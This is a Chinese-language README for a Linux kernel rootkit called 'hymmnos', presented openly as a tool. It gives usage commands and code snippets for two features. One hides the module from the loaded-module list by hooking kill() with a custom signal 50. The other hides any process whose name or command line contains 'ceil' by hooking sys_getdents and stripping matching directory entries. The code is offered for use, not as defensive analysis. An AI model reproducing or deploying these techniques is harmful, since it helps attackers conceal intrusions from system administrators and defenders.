#

## 1.隐藏rootkit自身

### 使用

+ `insmod hymmnos` 加载内核模块

        ```
            $ cat /proc/modules | grep hymmnos
            hymmnos 24576 0 - Live 0x0000000000000000 (OE)
        ```
    可以查看到hymmnos模块已被加载
+ `kill -50 7` 隐藏`rootkit`自身

        ```
            $ kill -50 7
            $ cat /proc/modules | grep hymmnos
        ```
    可以看到`rootkit`已被隐藏
+ 再次使用`kill -50 7`恢复`hymmnos`模块

### 实现

自定义`#define SIGHIDEHYMMNOS 50`
当执行被`hook`之后的`kill`函数,并传递信号值为50时，`kill`函数会判断`hymmnos`模块是否已被隐藏，隐藏则重新显示。

    ```
    case SIGHIDEHYMMNOS:
        if (hidden)
            show();
        else
            hide();
        break;

    ```

`hiden()`函数实现：

+ 先对内核模块加锁，防止出现异常

+ 获取当前已加载模块列表，存储到`mod_list`中

+ 删除当前已加载模块列表

+ 回收模块段属性空间，并将模块段属性值置为`null`

+ 解除加锁，将模块状态标记为已隐藏

`show()`函数实现:

+ 判断模块是否已被隐藏

+ 对内核模块加锁，防止出现异常

+ 将存储在`mod_list`中的隐藏前的已加载模块列表重新添加到`THIS_MODULE->list`

+ 解除加锁，将模块状态标记为显示

## 2.隐藏包含命令行和执行文件名称中包含特定字符串的进程

### 使用

+ `sudo insmod hymmnos`加载内核模块

+ `ps -aux | grep ceil` 查看包含`ceil`字符串的进程
  发现这样的进程已经全部被隐藏

+ `sudo rmmod hymmnos`卸载内核模块

+ 再次执行`ps -aux | grep ceil`
  可以重新打印出被隐藏的进程

### 实现

自定义`#define COMMAND_CONTAINS "ceil"`
当执行被`hook`之后的`sys_getdents`函数时，会在该函数执行过程中判断该进程可执行文件是否包含预定义的`COMMAND_CONTAINS`、该进程是否包含包含预定义的`COMMAND_CONTAINS`在可执行文件名称或命令行中，包含则将相应内容删除。

    ```
    if (strstr(buf, COMMAND_CONTAINS))
    {
        if (DEBUG)
            printk(KERN_INFO "hiding %s\n", buf);
        res = 1;
    }
    ```

    ```
    while (off < ret)
    {
        dir = (void *)kdir + off;
        if (should_be_hidden((char *)dir->d_name))
        {
            //printk(KERN_INFO "hiden %s\n", dir->d_name);
            if (dir == kdir)
            {
                ret -= dir->d_reclen;
                memmove(dir, (void *)dir + dir->d_reclen, ret); //remove
                continue;
            }
            prev->d_reclen += dir->d_reclen;
        }
        else
        {
            prev = dir;
        }
        off += dir->d_reclen;
    }
    ```

